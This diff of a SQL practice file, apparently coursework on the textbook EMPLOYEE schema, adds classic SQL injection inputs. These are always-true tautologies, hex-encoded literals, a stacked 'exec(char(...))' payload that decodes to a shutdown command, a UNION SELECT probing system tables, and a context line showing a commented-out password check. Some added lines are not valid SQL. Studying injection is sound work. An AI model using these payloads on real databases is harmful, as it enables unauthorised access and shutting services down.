@@ -6,6 +6,10 @@ select Fname, Lname, Ssn
 from EMPLOYEE,
 where Salary > 30000;
 
+select Fname, Lname, Ssn
+from EMPLOYEE
+where Dno=5 and Sex='M';
+
 select Dname
 from EMPLOYEE, DEPARTMENT
 where Dno=Dnumber
@@ -143,4 +147,36 @@ WHERE username='admin' -- AND password='anyPassword
 
 select Fname, Lname, Ssn
 from EMPLOYEE
-where Dno=5 and Sex='M';
+where Dno=5 or 1+1+1=3;
+
+select Fname, Lname, Ssn
+from EMPLOYEE
+where Dno=5 or 1+1+1+1+1+1=6;
+
+select Fname, Lname, Ssn
+from EMPLOYEE
+where Dno = char(0x45ef);
+
+select Fname, Lname, Ssn
+from EMPLOYEE
+where Dno = 0xffe;
+
+select Fname, Lname, Ssn
+from EMPLOYEE
+where Dno = U+0021;
+
+select Fname, Lname, Ssn
+from EMPLOYEE
+where Dno = char(U+0021);
+
+SELECT *
+FROM users
+WHERE login= '' AND pass=' ';exec(char(0x73687574646f776e)) '
+
+SELECT *
+FROM users
+WHERE login= '' AND pass=' ';char(0x73687574646f776e) '
+
+SELECT name, description, price
+FROM products
+WHERE category=1 UNION SELECT 'A','B', 3 FROM all_tables
